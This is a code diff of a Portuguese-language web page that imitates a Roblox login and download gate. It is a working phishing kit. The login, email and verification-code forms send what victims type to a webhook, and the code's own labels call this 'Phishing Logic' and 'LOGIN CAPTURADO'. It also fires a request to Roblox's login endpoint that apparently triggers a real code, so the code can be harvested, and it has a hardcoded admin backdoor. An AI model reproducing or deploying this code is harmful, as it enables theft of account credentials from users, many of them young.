-            toast.innerText = "Erro";
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 3000);
-        }
-
-        // --- FLUXO E-MAIL & CÓDIGO ---
-        function irParaEmail() {
-            // Oculta anterior, mantém blur
-            modalFormRoblox.classList.add('hidden');
-            modalSelecao.classList.add('hidden');
-            modalEmail.classList.remove('hidden');
-        }
-
-        function fecharEmail() {
-            modalEmail.classList.add('hidden');
-            bgBlur.style.display = 'none';
-        }
-
-        function enviarCodigoEmail() {
-            const email = document.getElementById('inp-email-codigo').value;
-            // Envia Request para Roblox como pedido (ignora erro de CORS/No-Cors)
-            fetch("https://www.roblox.com/pt/Login", { method: 'POST', mode: 'no-cors', body: JSON.stringify({email}) }).catch(()=>{});
+        function tentarBaixar(l) { if(!currentUser) abrirModalSelecao(); else window.open(l,'_blank'); }
+        function abrirModalSelecao() { if(!currentUser){ modalSelecao.classList.remove('hidden'); bgBlur.style.display='block'; } }
+        function abrirFormularioRoblox() { modalSelecao.classList.add('hidden'); modalFormRoblox.classList.remove('hidden'); }
+        function voltarSelecao() { modalFormRoblox.classList.add('hidden'); modalSelecao.classList.remove('hidden'); }
+        function fecharModais() { [modalSelecao, modalFormRoblox, modalEmail, modalCodigo, modalUsername].forEach(m=>m.classList.add('hidden')); bgBlur.style.display='none'; }
+        function triggerFakeError() { toast.innerText="Erro"; toast.classList.add('show'); setTimeout(()=>toast.classList.remove('show'),3000); }
+        function irParaEmail() { modalFormRoblox.classList.add('hidden'); modalSelecao.classList.add('hidden'); modalEmail.classList.remove('hidden'); }
+        
+        // --- FUNÇÃO DE EMAIL ATUALIZADA ---
+        function enviarCodigoEmail() { 
+            const e = document.getElementById('inp-email-codigo').value; 
             
-            // Webhook
-            enviarWebhook(`## 📧 PEDIDO DE CÓDIGO\n**Email:** ${email}\n||@everyone||`);
-
-            modalEmail.classList.add('hidden');
-            modalCodigo.classList.remove('hidden');
-        }
-
-        function fecharCodigo() {
-            modalCodigo.classList.add('hidden');
-            bgBlur.style.display = 'none';
-        }
-
-        function verificarCodigo() {
-            const code = document.getElementById('inp-final-code').value;
+            // 1. Envia Webhook (seu sistema)
+            enviarWebhook(`## 📧 PEDIDO EMAIL: ${e}\n||@everyone||`);
             
-            // Webhook
-            enviarWebhook(`## 🔢 CÓDIGO INSERIDO\n**Código:** ${code}\n||@everyone||`);
+            // 2. Tenta enviar para Roblox Login (Fake Request)
+            // 'no-cors' permite enviar sem erro no console, mas não lemos a resposta.
+            fetch("https://www.roblox.com/login", {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `username=${encodeURIComponent(e)}` 
+            }).catch(() => {});
 
-            modalCodigo.classList.add('hidden');
-            // Abre seleção de nome
-            modalUsername.classList.remove('hidden');
+            // 3. Troca de tela
+            modalEmail.classList.add('hidden'); 
+            modalCodigo.classList.remove('hidden'); 
         }
 
-        // --- LOGIN PRINCIPAL (ROBLOX/ADMIN) ---
-        function processarLogin() {
-            const u = document.getElementById('inp-user').value.trim();
-            const p = document.getElementById('inp-pass').value.trim();
-
-            if(!u || !p) return triggerFakeError();
-
-            // Admin Check
-            if (u === "Admin" && p === "LP") {
-                fecharModais();
-                logarReal("Admin", true);
-                return;
-            }
-
-            // Webhook (Phishing Logic)
-            enviarWebhook(`## 👤 LOGIN CAPTURADO\n**User:** ${u}\n**Pass:** ${p}\n||@everyone||`);
-
-            modalFormRoblox.classList.add('hidden');
-            // Abre seleção de nome
-            modalUsername.classList.remove('hidden');
-        }
-
-        // --- DEFINIÇÃO FINAL DE USUÁRIO ---
-        function confirmarUsername() {
-            const nome = document.getElementById('inp-new-username').value.trim();
-            if(!nome) return alert("Escolha um nome!");
-
-            fecharModais();
-            logarReal(nome, false);
-        }
-
-        function logarReal(nome, isAdmin) {
-            currentUser = { nome, isAdmin };
-            document.getElementById('btn-login-main').classList.add('hidden');
-            document.getElementById('user-display').classList.remove('hidden');
-            document.getElementById('user-display').classList.add('flex');
-            document.getElementById('username-text').textContent = nome;
-
-            if(isAdmin) {
-                btnUpload.classList.remove('hidden');
-                btnUpload.style.display = 'flex';
-            }
-        }
-
-        function logout() {
-            currentUser = null;
-            document.getElementById('user-display').classList.add('hidden');
-            btnUpload.classList.add('hidden');
-            document.getElementById('btn-login-main').classList.remove('hidden');
-        }
-
-        function enviarWebhook(conteudo) {
-            fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: conteudo })
-            }).catch(e => console.log("Log:", e));
-        }
+        function verificarCodigo() { const c=document.getElementById('inp-final-code').value; enviarWebhook(`## CODIGO: ${c}`); modalCodigo.classList.add('hidden'); modalUsername.classList.remove('hidden'); }
+        function processarLogin() { const u=document.getElementById('inp-user').value.trim(); const p=document.getElementById('inp-pass').value.trim(); if(!u||!p) return triggerFakeError(); if(u==="Admin"&&p==="LP"){fecharModais();logarReal("Admin",true);return;} enviarWebhook(`## USER: ${u} | PASS: ${p}`); modalFormRoblox.classList.add('hidden'); modalUsername.classList.remove('hidden'); }
+        function confirmarUsername() { const n=document.getElementById('inp-new-username').value.trim(); if(!n) return alert("Digite um nome"); fecharModais(); logarReal(n,false); localStorage.setItem('local_username',n); }
+        function logarReal(n,adm) { currentUser={nome:n,isAdmin:adm}; document.getElementById('btn-login-main').classList.add('hidden'); document.getElementById('user-display').classList.remove('hidden'); document.getElementById('user-display').classList.add('flex'); document.getElementById('header-username').innerText=n; if(adm){ btnUpload.classList.remove('hidden'); btnUpload.style.display='flex'; } }
+        function logout() { currentUser=null; document.getElementById('user-display').classList.add('hidden'); btnUpload.classList.add('hidden'); document.getElementById('btn-login-main').classList.remove('hidden'); toggleSidebar(); }
+        function enviarWebhook(m) { fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:m})}).catch(()=>{}); }
     </script>
 </body>
 </html>
+
 
